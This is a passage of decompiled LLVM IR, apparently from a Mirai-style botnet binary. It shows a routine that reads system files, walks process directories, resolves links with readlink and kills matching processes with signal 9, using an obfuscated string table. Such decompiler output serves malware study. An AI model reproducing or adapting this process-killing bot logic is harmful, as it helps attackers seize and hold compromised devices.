  %v0_cabc = phi i32 [ %v4_ca88, %.thread8 ], [ %v4_ca88, %bb126 ], [ %v6_caac, %bb127 ], [ %v6_caac, %dec_label_pc_caa8 ]
  %v2_cabc = icmp eq i32 %v0_cabc, 0
  br i1 %v2_cabc, label %dec_label_pc_ca6c.backedge, label %dec_label_pc_cac4

dec_label_pc_ca6c.backedge:                       ; preds = %dec_label_pc_cabc, %dec_label_pc_cb8c, %dec_label_pc_cbd8, %dec_label_pc_cb08
  %v0_ca74 = load i32, i32* @r8, align 4
  %v4_ca78 = call i32 @util_fdgets(i8* nonnull %stack_var_-585, i32 512, i32 %v0_ca74)
  %v2_ca7c = icmp eq i32 %v4_ca78, 0
  br i1 %v2_ca7c, label %dec_label_pc_cc04.loopexit, label %dec_label_pc_ca84

dec_label_pc_cac4:                                ; preds = %dec_label_pc_cabc
  %v1_cac8 = add i32 %v1_cae8, 2
  %v2_cad0 = add i32 %v1_cac8, %v2_cacc
  %v1_cad4 = add i32 %v2_cad0, -545
  %v2_cad4 = inttoptr i32 %v1_cad4 to i8*
  %v3_cad4 = load i8, i8* %v2_cad4, align 1
  %v2_cad8 = icmp eq i8 %v3_cad4, 0
  br i1 %v2_cad8, label %bb129, label %bb128

bb128:                                            ; preds = %dec_label_pc_cac4
  %v8_cadc = icmp eq i8 %v3_cad4, 32
  br i1 %v8_cadc, label %.thread13, label %dec_label_pc_cae8

.thread13:                                        ; preds = %bb128
  store i32 %v1_cac8, i32* @r5, align 4
  br label %dec_label_pc_cb08

bb129:                                            ; preds = %dec_label_pc_cac4
  store i32 %v1_cac8, i32* @r5, align 4
  br label %dec_label_pc_cb08

dec_label_pc_cae8:                                ; preds = %bb128
  %v0_cae8 = load i32, i32* @r6, align 4
  %v2_cae8 = add i32 %v0_cae8, %v1_cae8
  br label %dec_label_pc_caf0

dec_label_pc_caf0:                                ; preds = %bb130, %dec_label_pc_cae8
  %v0_cafc16 = phi i32 [ %v1_cafc, %bb130 ], [ %v1_cac8, %dec_label_pc_cae8 ]
  %v0_cb0018 = phi i32 [ %v1_cb00, %bb130 ], [ %v2_cae8, %dec_label_pc_cae8 ]
  %v1_caf0 = add i32 %v0_cb0018, 3
  %v2_caf0 = inttoptr i32 %v1_caf0 to i8*
  %v3_caf0 = load i8, i8* %v2_caf0, align 1
  %v2_caf4 = icmp eq i8 %v3_caf0, 0
  br i1 %v2_caf4, label %.thread15, label %bb130

.thread15:                                        ; preds = %dec_label_pc_caf0
  %v1_cafc17 = add i32 %v0_cafc16, 1
  store i32 %v1_cafc17, i32* @r5, align 4
  br label %dec_label_pc_cb08

bb130:                                            ; preds = %dec_label_pc_caf0
  %v8_caf8 = icmp eq i8 %v3_caf0, 32
  %v1_cafc = add i32 %v0_cafc16, 1
  store i32 %v1_cafc, i32* @r5, align 4
  %v1_cb00 = add i32 %v0_cb0018, 1
  br i1 %v8_caf8, label %dec_label_pc_cb08, label %dec_label_pc_caf0

dec_label_pc_cb08:                                ; preds = %bb130, %bb129, %.thread15, %.thread13
  %v1_cb14 = phi i32 [ %v1_cafc17, %.thread15 ], [ %v1_cac8, %.thread13 ], [ %v1_cac8, %bb129 ], [ %v1_cafc, %bb130 ]
  %v0_cb08 = load i32, i32* @r6, align 4
  %v2_cb08 = add i32 %v0_cb08, %v1_cac8
  store i32 %v2_cb08, i32* @r4, align 4
  %v2_cb14 = add i32 %v1_cb14, %v2_cacc
  store i32 0, i32* @r7, align 4
  %v3_cb1c = add i32 %v2_cb14, -545
  %v4_cb1c = inttoptr i32 %v3_cb1c to i8*
  store i8 0, i8* %v4_cb1c, align 1
  %v0_cb20 = load i32, i32* @r4, align 4
  %v1_cb24 = inttoptr i32 %v0_cb20 to i8*
  %v2_cb24 = call i32 @util_strlen(i8* %v1_cb24)
  store i32 %v2_cb24, i32* @r1, align 4
  %v0_cb30 = load i32, i32* @r4, align 4
  %v3_cb34 = inttoptr i32 %v0_cb30 to i8*
  %v4_cb34 = call i32 @util_stristr(i8* %v3_cb34, i32 %v2_cb24, i32 %v2_c9fc)
  %v7_cb38 = icmp eq i32 %v4_cb34, -1
  br i1 %v7_cb38, label %dec_label_pc_ca6c.backedge, label %dec_label_pc_cb54.preheader

dec_label_pc_cb54.preheader:                      ; preds = %dec_label_pc_cb08
  %v1_cb3c = load i32, i32* @r7, align 4
  %v1_cb40 = load i32, i32* @r6, align 4
  %v2_cb40 = load i32, i32* @r5, align 4
  %v3_cb40 = add i32 %v2_cb40, %v1_cb40
  store i32 %v1_cb3c, i32* @lr, align 4
  %v1_cb5448 = add i32 %v3_cb40, 2
  %v2_cb5449 = inttoptr i32 %v1_cb5448 to i8*
  %v3_cb5450 = load i8, i8* %v2_cb5449, align 1
  %v4_cb5451 = zext i8 %v3_cb5450 to i32
  store i32 %v4_cb5451, i32* @r3, align 4
  %v2_cb5852 = icmp eq i8 %v3_cb5450, 0
  %v1_cb5c54 = add i32 %v2_cb40, 2
  br i1 %v2_cb5852, label %dec_label_pc_cb8c, label %dec_label_pc_cb64

dec_label_pc_cb64:                                ; preds = %dec_label_pc_cb54.preheader, %dec_label_pc_cb54.backedge
  %v0_cb8c83 = phi i32 [ %v0_cb8c81, %dec_label_pc_cb54.backedge ], [ %v1_cb3c, %dec_label_pc_cb54.preheader ]
  %v0_cb74.pr = phi i32 [ %v0_cb74.pr70, %dec_label_pc_cb54.backedge ], [ %v1_cb3c, %dec_label_pc_cb54.preheader ]
  %v0_ce94 = phi i32 [ %v0_ce9473, %dec_label_pc_cb54.backedge ], [ %v1_cb3c, %dec_label_pc_cb54.preheader ]
  %v0_cb5c78 = phi i32 [ %v1_cb5c, %dec_label_pc_cb54.backedge ], [ %v1_cb5c54, %dec_label_pc_cb54.preheader ]
  %v0_cb84 = phi i32 [ %v0_cb54, %dec_label_pc_cb54.backedge ], [ %v3_cb40, %dec_label_pc_cb54.preheader ]
  %v1_cb68 = phi i32 [ %v4_cb54, %dec_label_pc_cb54.backedge ], [ %v4_cb5451, %dec_label_pc_cb54.preheader ]
  %v7_cb64 = icmp eq i32 %v1_cb68, 9
  br i1 %v7_cb64, label %bb132, label %bb131

bb131:                                            ; preds = %dec_label_pc_cb64
  %v8_cb68 = icmp eq i32 %v1_cb68, 32
  br i1 %v8_cb68, label %.thread27, label %dec_label_pc_cb74

.thread27:                                        ; preds = %bb131
  br label %dec_label_pc_cb80

bb132:                                            ; preds = %dec_label_pc_cb64
  br label %dec_label_pc_cb80

dec_label_pc_cb74:                                ; preds = %bb131
  %v7_cb74 = icmp eq i32 %v0_cb74.pr, 1
  br i1 %v7_cb74, label %dec_label_pc_ce94, label %dec_label_pc_cb7c

dec_label_pc_cb7c:                                ; preds = %dec_label_pc_ce94, %dec_label_pc_cb74
  %v0_cb8075 = phi i32 [ %v1_ce94, %dec_label_pc_ce94 ], [ %v0_ce94, %dec_label_pc_cb74 ]
  br label %dec_label_pc_cb80

dec_label_pc_cb80:                                ; preds = %bb132, %.thread27, %dec_label_pc_cb7c
  %v0_cb80 = phi i32 [ %v0_ce94, %.thread27 ], [ %v0_ce94, %bb132 ], [ %v0_cb8075, %dec_label_pc_cb7c ]
  %v0_cb74.pr71 = phi i32 [ 1, %.thread27 ], [ 1, %bb132 ], [ 0, %dec_label_pc_cb7c ]
  %v7_cb88 = icmp sgt i32 %v0_cb80, 6
  br i1 %v7_cb88, label %dec_label_pc_cb8c, label %dec_label_pc_cb54.backedge

dec_label_pc_cb8c:                                ; preds = %dec_label_pc_cb54.backedge, %dec_label_pc_cb80, %dec_label_pc_cb54.preheader
  %v1_cbdc = phi i32 [ %v1_cb5c54, %dec_label_pc_cb54.preheader ], [ %v1_cb5c, %dec_label_pc_cb54.backedge ], [ %v0_cb5c78, %dec_label_pc_cb80 ]
  %v0_cb8c = phi i32 [ %v1_cb3c, %dec_label_pc_cb54.preheader ], [ %v0_cb8c81, %dec_label_pc_cb54.backedge ], [ %v0_cb8c83, %dec_label_pc_cb80 ]
  %v2_cb8c = icmp eq i32 %v0_cb8c, 0
  br i1 %v2_cb8c, label %dec_label_pc_ca6c.backedge, label %dec_label_pc_cb98

dec_label_pc_cb98:                                ; preds = %dec_label_pc_cb8c
  %v2_cba0 = add i32 %v1_cbdc, %v2_cacc
  %v1_cba4 = add i32 %v2_cba0, -545
  %v2_cba4 = inttoptr i32 %v1_cba4 to i8*
  %v3_cba4 = load i8, i8* %v2_cba4, align 1
  %v2_cba8 = icmp eq i8 %v3_cba4, 0
  br i1 %v2_cba8, label %dec_label_pc_cbd8, label %bb133

bb133:                                            ; preds = %dec_label_pc_cb98
  %v8_cbac = icmp eq i8 %v3_cba4, 32
  br i1 %v8_cbac, label %dec_label_pc_cbd8, label %dec_label_pc_cbb4

dec_label_pc_cbb4:                                ; preds = %bb133
  %v2_cbb4 = add i32 %v1_cbdc, %v1_cb40
  br label %dec_label_pc_cbb8

dec_label_pc_cbb8:                                ; preds = %bb134, %dec_label_pc_cbb4
  %v0_cbc430 = phi i32 [ %v1_cbc4, %bb134 ], [ %v1_cbdc, %dec_label_pc_cbb4 ]
  %v0_cbb8 = phi i32 [ %v1_cbb8, %bb134 ], [ %v2_cbb4, %dec_label_pc_cbb4 ]
  %v1_cbb8 = add i32 %v0_cbb8, 1
  %v2_cbb8 = inttoptr i32 %v1_cbb8 to i8*
  %v3_cbb8 = load i8, i8* %v2_cbb8, align 1
  %v2_cbbc = icmp eq i8 %v3_cbb8, 0
  br i1 %v2_cbbc, label %.thread29, label %bb134

.thread29:                                        ; preds = %dec_label_pc_cbb8
  %v1_cbc431 = add i32 %v0_cbc430, 1
  br label %dec_label_pc_cbcc

bb134:                                            ; preds = %dec_label_pc_cbb8
  %v8_cbc0 = icmp eq i8 %v3_cbb8, 32
  %v1_cbc4 = add i32 %v0_cbc430, 1
  br i1 %v8_cbc0, label %dec_label_pc_cbcc, label %dec_label_pc_cbb8

dec_label_pc_cbcc:                                ; preds = %bb134, %.thread29
  %v1_cbd4 = phi i32 [ %v1_cbc431, %.thread29 ], [ %v1_cbc4, %bb134 ]
  %v2_cbd4 = add i32 %v1_cbd4, %v2_cacc
  br label %dec_label_pc_cbd8

dec_label_pc_cbd8:                                ; preds = %dec_label_pc_cb98, %bb133, %dec_label_pc_cbcc
  %v2_cbe4 = phi i32 [ %v2_cba0, %dec_label_pc_cb98 ], [ %v2_cba0, %bb133 ], [ %v2_cbd4, %dec_label_pc_cbcc ]
  %v2_cbdc = add i32 %v1_cbdc, %v1_cb40
  store i32 %v2_cbdc, i32* @r4, align 4
  %v3_cbe4 = add i32 %v2_cbe4, -545
  %v4_cbe4 = inttoptr i32 %v3_cbe4 to i8*
  store i8 0, i8* %v4_cbe4, align 1
  %v1_cbe8 = inttoptr i32 %v2_cbdc to i8*
  %v2_cbe8 = call i32 @util_strlen(i8* %v1_cbe8)
  %v8_cbf0 = icmp sgt i32 %v2_cbe8, 15
  br i1 %v8_cbf0, label %dec_label_pc_ca6c.backedge, label %dec_label_pc_cbf4

dec_label_pc_cbf4:                                ; preds = %dec_label_pc_cbd8
  %v0_cbf8 = load i32, i32* @r4, align 4
  %v2_cbfc = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_cbfc, i32* @r0, align 4
  %v2_cc00 = bitcast i32* %stack_var_-56 to i8*
  %v3_cc00 = call i32 @util_strcpy(i8* %v2_cc00, i32 %v0_cbf8)
  br label %dec_label_pc_cc04

dec_label_pc_cc04.loopexit:                       ; preds = %dec_label_pc_ca6c.backedge, %dec_label_pc_ca6c.preheader
  %.pre = ptrtoint i32* %stack_var_-56 to i32
  %.pre92 = bitcast i32* %stack_var_-56 to i8*
  br label %dec_label_pc_cc04

dec_label_pc_cc04:                                ; preds = %dec_label_pc_cc04.loopexit, %dec_label_pc_cbf4
  %v1_cc14.pre-phi = phi i8* [ %.pre92, %dec_label_pc_cc04.loopexit ], [ %v2_cc00, %dec_label_pc_cbf4 ]
  %v2_cc10.pre-phi = phi i32 [ %.pre, %dec_label_pc_cc04.loopexit ], [ %v2_cbfc, %dec_label_pc_cbf4 ]
  %v0_cc04 = load i32, i32* @r8, align 4
  %v1_cc08 = call i32 @__GI___libc_close(i32 %v0_cc04)
  %v2_cc14 = call i32 @util_strlen(i8* %v1_cc14.pre-phi)
  store i32 %v2_cc14, i32* @r4, align 4
  %v2_cc18 = icmp eq i32 %v2_cc14, 0
  br i1 %v2_cc18, label %dec_label_pc_cec0, label %dec_label_pc_cc20

dec_label_pc_cc20:                                ; preds = %dec_label_pc_cc04
  %v3_cc28 = call i32 @table_retrieve_val(i32 13, i32* null)
  %v1_cc2c = call i32 @__GI_opendir(i32 %v3_cc28)
  store i32 %v1_cc2c, i32* @sb, align 4
  %v2_cc30 = icmp eq i32 %v1_cc2c, 0
  br i1 %v2_cc30, label %dec_label_pc_ce60, label %dec_label_pc_cc40.preheader

dec_label_pc_cc40.preheader:                      ; preds = %dec_label_pc_cc20
  store i32 0, i32* @r5, align 4
  %v1_cc4443 = inttoptr i32 %v1_cc2c to i32*
  %v2_cc4444 = call i32 @__GI_readdir(i32* %v1_cc4443)
  %v2_cc4846 = icmp eq i32 %v2_cc4444, 0
  br i1 %v2_cc4846, label %dec_label_pc_ce54, label %dec_label_pc_cc50.preheader

dec_label_pc_cc40.loopexit:                       ; preds = %dec_label_pc_cc58, %dec_label_pc_cc68, %dec_label_pc_ccd4
  %v0_cc40 = load i32, i32* @sb, align 4
  %v1_cc44 = inttoptr i32 %v0_cc40 to i32*
  %v2_cc44 = call i32 @__GI_readdir(i32* %v1_cc44)
  %v2_cc48 = icmp eq i32 %v2_cc44, 0
  br i1 %v2_cc48, label %dec_label_pc_ce54, label %dec_label_pc_cc50.preheader

dec_label_pc_cc50.preheader:                      ; preds = %dec_label_pc_cc40.preheader, %dec_label_pc_cc40.loopexit
  %v0_cc5891 = phi i32 [ %v2_cc44, %dec_label_pc_cc40.loopexit ], [ %v2_cc4444, %dec_label_pc_cc40.preheader ]
  br label %dec_label_pc_cc50

dec_label_pc_cc50:                                ; preds = %dec_label_pc_cc50.preheader, %dec_label_pc_ce3c
  %v0_cc70 = phi i32 [ %v0_cc5891, %dec_label_pc_cc50.preheader ], [ %v2_ce48, %dec_label_pc_ce3c ]
  %v0_cc50 = load i32, i32* @r5, align 4
  %v2_cc50 = icmp eq i32 %v0_cc50, 0
  br i1 %v2_cc50, label %dec_label_pc_cc58, label %dec_label_pc_ce54

dec_label_pc_cc58:                                ; preds = %dec_label_pc_cc50
  %v1_cc58 = add i32 %v0_cc70, 11
  %v2_cc58 = inttoptr i32 %v1_cc58 to i8*
  %v3_cc58 = load i8, i8* %v2_cc58, align 1
  %v4_cc58 = zext i8 %v3_cc58 to i32
  %v1_cc5c = add nsw i32 %v4_cc58, -48
  %tmp = icmp ugt i32 %v1_cc5c, 9
  br i1 %tmp, label %dec_label_pc_cc40.loopexit, label %dec_label_pc_cc68

dec_label_pc_cc68:                                ; preds = %dec_label_pc_cc58
  store i32 %v1_cc58, i32* @r7, align 4
  %v3_cc74 = call i32 @table_retrieve_val(i32 13, i32* null)
  store i32 %v2_c9d4, i32* @r0, align 4
  %v3_cc80 = call i32 @util_strcpy(i8* %v3_c9f8, i32 %v3_cc74)
  %v2_cc88 = call i32 @util_strlen(i8* %v3_c9f8)
  %v0_cc8c = load i32, i32* @r7, align 4
  %v1_cc90 = load i32, i32* @sl, align 4
  %v2_cc90 = add i32 %v1_cc90, %v2_cc88
  store i32 %v2_cc90, i32* @r0, align 4
  %v2_cc94 = inttoptr i32 %v2_cc90 to i8*
  %v3_cc94 = call i32 @util_strcpy(i8* %v2_cc94, i32 %v0_cc8c)
  %v2_cc9c = call i32 @util_strlen(i8* %v3_c9f8)
  %v0_cca0 = load i32, i32* @r5, align 4
  store i32 %v2_cc9c, i32* @r4, align 4
  %v2_ccac = inttoptr i32 %v0_cca0 to i32*
  %v3_ccac = call i32 @table_retrieve_val(i32 14, i32* %v2_ccac)
  %v0_ccb4 = load i32, i32* @r4, align 4
  %v1_ccb4 = load i32, i32* @sl, align 4
  %v2_ccb4 = add i32 %v1_ccb4, %v0_ccb4
  store i32 %v2_ccb4, i32* @r0, align 4
  %v2_ccb8 = inttoptr i32 %v2_ccb4 to i8*
  %v3_ccb8 = call i32 @util_strcpy(i8* %v2_ccb8, i32 %v3_ccac)
  %v3_ccc8 = call i32 @readlink(i32 %v2_c9d4, i32 %v2_c9c4, i32 4096)
  %v7_cccc = icmp eq i32 %v3_ccc8, -1
  br i1 %v7_cccc, label %dec_label_pc_cc40.loopexit, label %dec_label_pc_ccd4

dec_label_pc_ccd4:                                ; preds = %dec_label_pc_cc68
  %v0_ccd4 = load i32, i32* @r5, align 4
  %v2_ccdc = inttoptr i32 %v0_ccd4 to i32*
  %v3_ccdc = call i32 @table_retrieve_val(i32 13, i32* %v2_ccdc)
  store i32 %v2_c9d4, i32* @r0, align 4
  %v3_cce8 = call i32 @util_strcpy(i8* %v3_c9f8, i32 %v3_ccdc)
  %v2_ccf0 = call i32 @util_strlen(i8* %v3_c9f8)
  %v0_ccf4 = load i32, i32* @r7, align 4
  %v1_ccf8 = load i32, i32* @sl, align 4
  %v2_ccf8 = add i32 %v1_ccf8, %v2_ccf0
  store i32 %v2_ccf8, i32* @r0, align 4
  %v2_ccfc = inttoptr i32 %v2_ccf8 to i8*
  %v3_ccfc = call i32 @util_strcpy(i8* %v2_ccfc, i32 %v0_ccf4)
  %v2_cd04 = call i32 @util_strlen(i8* %v3_c9f8)
  %v0_cd08 = load i32, i32* @r5, align 4
  store i32 %v2_cd04, i32* @r4, align 4
  %v2_cd14 = inttoptr i32 %v0_cd08 to i32*
  %v3_cd14 = call i32 @table_retrieve_val(i32 15, i32* %v2_cd14)
  %v0_cd1c = load i32, i32* @r4, align 4
  %v1_cd1c = load i32, i32* @sl, align 4
  %v2_cd1c = add i32 %v1_cd1c, %v0_cd1c
  store i32 %v2_cd1c, i32* @r0, align 4
  %v2_cd20 = inttoptr i32 %v2_cd1c to i8*
  %v3_cd20 = call i32 @util_strcpy(i8* %v2_cd20, i32 %v3_cd14)
  %v1_cd28 = call i32 @__GI_opendir(i32 %v2_c9d4)
  store i32 %v1_cd28, i32* @r8, align 4
  %v2_cd2c = icmp eq i32 %v1_cd28, 0
  br i1 %v2_cd2c, label %dec_label_pc_cc40.loopexit, label %dec_label_pc_cd34.preheader

dec_label_pc_cd34.preheader:                      ; preds = %dec_label_pc_ccd4
  %v1_cd3838 = inttoptr i32 %v1_cd28 to i32*
  %v2_cd3839 = call i32 @__GI_readdir(i32* %v1_cd3838)
  store i32 %v2_cd3839, i32* @r6, align 4
  %v2_cd3c41 = icmp eq i32 %v2_cd3839, 0
  store i32 4096, i32* @r1, align 4
  store i32 %v2_c9c4, i32* @r0, align 4
  br i1 %v2_cd3c41, label %dec_label_pc_ce3c, label %dec_label_pc_cd4cthread-pre-split

dec_label_pc_cd34.loopexit:                       ; preds = %dec_label_pc_cd54, %dec_label_pc_cdec
  %v0_cd34 = load i32, i32* @r8, align 4
  %v1_cd38 = inttoptr i32 %v0_cd34 to i32*
  %v2_cd38 = call i32 @__GI_readdir(i32* %v1_cd38)
  store i32 %v2_cd38, i32* @r6, align 4
  %v2_cd3c = icmp eq i32 %v2_cd38, 0
  store i32 4096, i32* @r1, align 4
  store i32 %v2_c9c4, i32* @r0, align 4
  br i1 %v2_cd3c, label %dec_label_pc_ce3c, label %dec_label_pc_cd4cthread-pre-split

dec_label_pc_cd4cthread-pre-split:                ; preds = %dec_label_pc_cd34.preheader, %dec_label_pc_cd34.loopexit
  %v0_cd4c.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_cd4c

dec_label_pc_cd4c:                                ; preds = %dec_label_pc_cd4cthread-pre-split, %dec_label_pc_ce14
  %v0_cd4c = phi i32 [ %v0_cd4c.pr, %dec_label_pc_cd4cthread-pre-split ], [ 1, %dec_label_pc_ce14 ]
  %v2_cd4c = icmp eq i32 %v0_cd4c, 0
  br i1 %v2_cd4c, label %dec_label_pc_cd54, label %dec_label_pc_ce3c

dec_label_pc_cd54:                                ; preds = %dec_label_pc_cd4c
  %v0_cd54 = call i32 @util_zero()
  %v0_cd58 = load i32, i32* @r5, align 4
  %v2_cd60 = inttoptr i32 %v0_cd58 to i32*
  %v3_cd60 = call i32 @table_retrieve_val(i32 13, i32* %v2_cd60)
  store i32 %v2_c9d4, i32* @r0, align 4
  %v3_cd6c = call i32 @util_strcpy(i8* %v3_c9f8, i32 %v3_cd60)
  %v2_cd74 = call i32 @util_strlen(i8* %v3_c9f8)
  %v0_cd78 = load i32, i32* @r7, align 4
  %v1_cd7c = load i32, i32* @sl, align 4
  %v2_cd7c = add i32 %v1_cd7c, %v2_cd74
  store i32 %v2_cd7c, i32* @r0, align 4
  %v2_cd80 = inttoptr i32 %v2_cd7c to i8*
  %v3_cd80 = call i32 @util_strcpy(i8* %v2_cd80, i32 %v0_cd78)
  %v2_cd88 = call i32 @util_strlen(i8* %v3_c9f8)
  %v0_cd8c = load i32, i32* @r5, align 4
  store i32 %v2_cd88, i32* @r4, align 4
  %v2_cd98 = inttoptr i32 %v0_cd8c to i32*
  %v3_cd98 = call i32 @table_retrieve_val(i32 15, i32* %v2_cd98)
  %v0_cda0 = load i32, i32* @r4, align 4
  %v1_cda0 = load i32, i32* @sl, align 4
  %v2_cda0 = add i32 %v1_cda0, %v0_cda0
  store i32 %v2_cda0, i32* @r0, align 4
  %v2_cda4 = inttoptr i32 %v2_cda0 to i8*
  %v3_cda4 = call i32 @util_strcpy(i8* %v2_cda4, i32 %v3_cd98)
  %v2_cdac = call i32 @util_strlen(i8* %v3_c9f8)
  %v1_cdb4 = load i32, i32* @sl, align 4
  %v2_cdb4 = add i32 %v1_cdb4, %v2_cdac
  store i32 %v2_cdb4, i32* @r0, align 4
  %v2_cdb8 = inttoptr i32 %v2_cdb4 to i8*
  %v3_cdb8 = call i32 @util_strcpy(i8* %v2_cdb8, i32 ptrtoint (i32* @global_var_1a7f8.69 to i32))
  %v2_cdc0 = call i32 @util_strlen(i8* %v3_c9f8)
  %v0_cdc4 = load i32, i32* @r6, align 4
  %v1_cdc4 = add i32 %v0_cdc4, 11
  %v1_cdc8 = load i32, i32* @sl, align 4
  %v2_cdc8 = add i32 %v1_cdc8, %v2_cdc0
  store i32 %v2_cdc8, i32* @r0, align 4
  %v2_cdcc = inttoptr i32 %v2_cdc8 to i8*
  %v3_cdcc = call i32 @util_strcpy(i8* %v2_cdcc, i32 %v1_cdc4)
  %v3_cddc = call i32 @readlink(i32 %v2_c9d4, i32 %v2_c9c4, i32 4096)
  %v7_cde0 = icmp eq i32 %v3_cddc, -1
  br i1 %v7_cde0, label %dec_label_pc_cd34.loopexit, label %dec_label_pc_cdec

dec_label_pc_cdec:                                ; preds = %dec_label_pc_cd54
  %v2_cdec = call i32 @util_strlen(i8* %v3_c9e4)
  store i32 %v2_cdec, i32* @r1, align 4
  %v4_ce00 = call i32 @util_stristr(i8* %v3_c9e4, i32 %v2_cdec, i32 %v2_cc10.pre-phi)
  %v7_ce04 = icmp eq i32 %v4_ce00, -1
  br i1 %v7_ce04, label %dec_label_pc_cd34.loopexit, label %dec_label_pc_ce14

dec_label_pc_ce14:                                ; preds = %dec_label_pc_cdec
  %v0_ce0c = load i32, i32* @r7, align 4
  %v2_ce14 = inttoptr i32 %v0_ce0c to i8*
  %v3_ce14 = call i32 @util_atoi(i8* %v2_ce14, i32 10)
  %v2_ce1c = call i32 @kill(i32 %v3_ce14, i32 9)
  %v0_ce20 = load i32, i32* @r8, align 4
  %v1_ce24 = inttoptr i32 %v0_ce20 to i32*
  %v2_ce24 = call i32 @__GI_readdir(i32* %v1_ce24)
  store i32 %v2_ce24, i32* @r6, align 4
  %v2_ce28 = icmp eq i32 %v2_ce24, 0
  store i32 1, i32* @r5, align 4
  store i32 4096, i32* @r1, align 4
  store i32 %v2_c9c4, i32* @r0, align 4
  br i1 %v2_ce28, label %dec_label_pc_ce3c, label %dec_label_pc_cd4c

dec_label_pc_ce3c:                                ; preds = %dec_label_pc_cd34.loopexit, %dec_label_pc_ce14, %dec_label_pc_cd4c, %dec_label_pc_cd34.preheader
  %v0_ce3c = load i32, i32* @r8, align 4
  %v1_ce40 = inttoptr i32 %v0_ce3c to i32*
  %v2_ce40 = call i32 @__GI_closedir(i32* %v1_ce40)
  %v0_ce44 = load i32, i32* @sb, align 4
  %v1_ce48 = inttoptr i32 %v0_ce44 to i32*
  %v2_ce48 = call i32 @__GI_readdir(i32* %v1_ce48)
  %v2_ce4c = icmp eq i32 %v2_ce48, 0
  br i1 %v2_ce4c, label %dec_label_pc_ce54, label %dec_label_pc_cc50

dec_label_pc_ce54:                                ; preds = %dec_label_pc_cc40.loopexit, %dec_label_pc_ce3c, %dec_label_pc_cc50, %dec_label_pc_cc40.preheader
  %v0_ce54 = load i32, i32* @sb, align 4
  %v1_ce58 = inttoptr i32 %v0_ce54 to i32*
  %v2_ce58 = call i32 @__GI_closedir(i32* %v1_ce58)
  %v0_ce5c = load i32, i32* @r5, align 4
  %v1_ce5c = urem i32 %v0_ce5c, 256
  br label %dec_label_pc_ce60

dec_label_pc_ce60:                                ; preds = %dec_label_pc_cc20, %dec_label_pc_ce54
  %storemerge = phi i32 [ %v1_ce5c, %dec_label_pc_ce54 ], [ 0, %dec_label_pc_cc20 ]
  store i32 %storemerge, i32* @r4, align 4
  %v1_ce64 = call i32 @sleep(i32 1)
  %v1_ce6c = call i32 @table_lock_val(i32 13)
  %v1_ce74 = call i32 @table_lock_val(i32 14)
  %v1_ce7c = call i32 @table_lock_val(i32 15)
  br label %dec_label_pc_ce80

dec_label_pc_ce80:                                ; preds = %bb, %dec_label_pc_cec0, %dec_label_pc_ce60
  %v0_ce80 = load i32, i32* @r4, align 4
  store i32 %v3_c97c, i32* @r4, align 4
  store i32 %v6_c97c, i32* @r5, align 4
  store i32 %v9_c97c, i32* @r6, align 4
  store i32 %v12_c97c, i32* @r7, align 4
  store i32 %v15_c97c, i32* @r8, align 4
  store i32 %v18_c97c, i32* @sb, align 4
  store i32 %v21_c97c, i32* @sl, align 4
  store i32 %v24_c97c, i32* @fp, align 4
  store i32 %v27_c97c, i32* @lr, align 4
  ret i32 %v0_ce80

dec_label_pc_ce94:                                ; preds = %dec_label_pc_cb74
  %v1_ce94 = add i32 %v0_ce94, 1
  %v7_ce98 = icmp eq i32 %v0_ce94, 0
  br i1 %v7_ce98, label %dec_label_pc_cea0, label %dec_label_pc_cb7c

dec_label_pc_cea0:                                ; preds = %dec_label_pc_ce94
  %v1_cea0 = add i32 %v0_cb84, 3
  %v2_cea0 = inttoptr i32 %v1_cea0 to i8*
  %v3_cea0 = load i8, i8* %v2_cea0, align 1
  %v7_cea4 = icmp eq i8 %v3_cea0, 65
  br i1 %v7_cea4, label %dec_label_pc_ceb8, label %dec_label_pc_ceac

dec_label_pc_ceac:                                ; preds = %dec_label_pc_cea0, %dec_label_pc_ceb8
  %v0_cb8c82 = phi i32 [ %v0_cb8c83, %dec_label_pc_cea0 ], [ 1, %dec_label_pc_ceb8 ]
  br label %dec_label_pc_cb54.backedge

dec_label_pc_cb54.backedge:                       ; preds = %dec_label_pc_ceac, %dec_label_pc_cb80
  %v0_cb8c81 = phi i32 [ %v0_cb8c82, %dec_label_pc_ceac ], [ %v0_cb8c83, %dec_label_pc_cb80 ]
  %v0_ce9473 = phi i32 [ %v1_ce94, %dec_label_pc_ceac ], [ %v0_cb80, %dec_label_pc_cb80 ]
  %v0_cb74.pr70 = phi i32 [ 0, %dec_label_pc_ceac ], [ %v0_cb74.pr71, %dec_label_pc_cb80 ]
  %v0_cb54 = add i32 %v0_cb84, 1
  %v1_cb54 = add i32 %v0_cb84, 3
  %v2_cb54 = inttoptr i32 %v1_cb54 to i8*
  %v3_cb54 = load i8, i8* %v2_cb54, align 1
  %v4_cb54 = zext i8 %v3_cb54 to i32
  store i32 %v4_cb54, i32* @r3, align 4
  %v2_cb58 = icmp eq i8 %v3_cb54, 0
  %v1_cb5c = add i32 %v0_cb5c78, 1
  br i1 %v2_cb58, label %dec_label_pc_cb8c, label %dec_label_pc_cb64

dec_label_pc_ceb8:                                ; preds = %dec_label_pc_cea0
  store i32 1, i32* @lr, align 4
  br label %dec_label_pc_ceac

dec_label_pc_cec0:                                ; preds = %dec_label_pc_cc04
  %v1_cec4 = call i32 @table_lock_val(i32 13)
  %v1_cecc = call i32 @table_lock_val(i32 14)
  %v1_ced4 = call i32 @table_lock_val(i32 15)
  %v1_cedc = call i32 @table_lock_val(i32 17)
  br label %dec_label_pc_ce80

dec_label_pc_cee4:                                ; preds = %entry
  store i8 48, i8* %stack_var_-72, align 1
  br label %dec_label_pc_ca28

; uselistorder directives
  uselistorder i32 %v1_cb5c, { 1, 0 }
  uselistorder i32 %v4_cb54, { 1, 0 }
  uselistorder i32 %v0_cb8c81, { 1, 0 }
  uselistorder i32 %v1_ce94, { 1, 0 }
  uselistorder i32 %v2_ce48, { 1, 0 }
  uselistorder i32 %v1_cbb8, { 1, 0 }
  uselistorder i32 %v0_cbc430, { 1, 0 }
  uselistorder i32 %v1_cbdc, { 0, 3, 1, 2 }
  uselistorder i32 %v0_cb80, { 1, 0 }
  uselistorder i32 %v0_cb5c78, { 1, 0 }
  uselistorder i32 %v0_ce94, { 4, 3, 0, 1, 2 }
  uselistorder i32 %v0_cb8c83, { 1, 2, 0 }
  uselistorder i32 %v1_cb5c54, { 1, 0 }
  uselistorder i32 %v2_cb40, { 1, 0 }
  uselistorder i32 %v1_cb3c, { 3, 1, 0, 2, 4 }
  uselistorder i32 %v1_cafc, { 0, 2, 1 }
  uselistorder i32 %v0_cafc16, { 1, 0 }
